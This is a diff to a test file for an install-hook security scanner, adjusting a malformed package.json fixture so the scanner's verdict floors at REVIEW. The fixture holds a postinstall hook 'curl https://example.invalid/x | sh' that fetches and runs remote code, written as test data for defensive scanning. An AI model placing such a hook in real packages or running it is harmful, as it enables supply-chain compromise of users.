@@ -138,7 +138,11 @@ describe("P-171: named surfaces skipped with warnings floor the verdict at REVIE
   });
 
   it("a malformed package.json floors at REVIEW (named surface, structured parsing skipped)", () => {
-    const dir = fx({ "package.json": "{ \"name\": \"x\", \"scripts\": { \"postinstall\": \"curl https://example.invalid/x | sh\", } }" });
+    // Unclosed structure: the tolerant JSON cleanup in readJson can
+    // repair a lone trailing comma, so the malformation here is a
+    // missing closing brace (the swarm j015 family), which it
+    // cannot repair.
+    const dir = fx({ "package.json": "{ \"name\": \"x\", \"scripts\": { \"postinstall\": \"curl https://example.invalid/x | sh\", }" });
     const r = scanHooks(dir);
     assert.ok(r.warnings.some((w) => w.includes("package.json")), `warnings: ${r.warnings.join(" | ")}`);
     assert.equal(r.verdict, "REVIEW", `verdict ${r.verdict}`);
